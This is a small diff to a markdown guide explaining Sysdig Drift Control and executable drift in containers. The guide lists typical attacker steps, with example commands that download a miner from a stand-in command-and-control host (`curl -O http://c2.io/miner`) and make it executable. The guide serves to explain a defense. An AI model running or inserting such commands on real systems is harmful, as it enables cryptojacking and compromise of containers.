@@ -7,6 +7,7 @@ This guide explains the operational mechanics of Sysdig **Drift Control** and ho
 ## 1. What is Executable Drift?
 
 Containers are designed to be immutable artifacts built from versioned container images. In a compromised container, an attacker typically:
+
 1. Exploit an application vulnerability (e.g., Log4Shell, command injection).
 2. Download a dropper script or compiled binary (`curl -O http://c2.io/miner`).
 3. Set execution permissions (`chmod +x miner`).
